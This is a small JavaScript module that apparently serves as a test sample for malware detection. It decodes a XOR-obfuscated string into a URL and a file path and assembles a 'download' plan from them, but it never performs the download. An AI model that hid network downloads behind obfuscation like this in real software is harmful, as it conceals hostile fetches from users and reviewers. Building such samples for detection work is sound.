  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_17e5c6ea = "[18,47,30,98,17,101,0,112,3,62,95,60,77,56,81,35,70,25,107,14,99,12,120,29,49,70,52,93,41,76,19,117,28,112,21,105,8,108,13,125,9,108,30,35,75,63,75,59,100,16,127,32,83,39,85,48,81,60,64,51,71,38,65,36,123,24,119,2,108,24,37,20,104,11,106,7,119,22,127,24,118,41,64,36,25,87,24,92,25,52,3,64,113,66,114,70,112,51,79,58,72,36,25,113,5,113,1,114,72,103,72,38,73,45,72,101,82,49,0,51,3,55,1,98,80,54,85,98,76,41,81,48,93,45,65,36,10,99,13,123,26,118,31,123,84,53,69,44,80,37,86,51,65,30,127,24,125,19,103,90,20,123,31,122,59,78,42,67,55,24,47,76,125,78,50,84,61,81,52,107,27,122,14,102,91,116,0,109,29,50,90,47,65,53,71,34,81,34,15,97,14,106,15,32,14,125,9,104,15,106,71,112,19,34,17,33,21,35,64,114,20,119,64,110,3,105,26]";
  const Codec_17e5c6ea = "json_numbers|rolling_xor|64";

  function load_17e5c6ea() { return JSON.parse(Material_17e5c6ea); }
  function decode_17e5c6ea(e) { let q = 100; return e.map((value) => { const decoded = value ^ q; q = value; return decoded; }); }
  async function recover_17e5c6ea() {
    const n = 19 * 7 - 133;
    const e = load_17e5c6ea(); let d = [];
    d = await (async () => decode_17e5c6ea(e))();
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_17e5c6ea() { return await recover_17e5c6ea(); }
  async function plan_17e5c6ea() { const inspect = inspect_17e5c6ea; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_17e5c6ea;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_17e5c6ea());
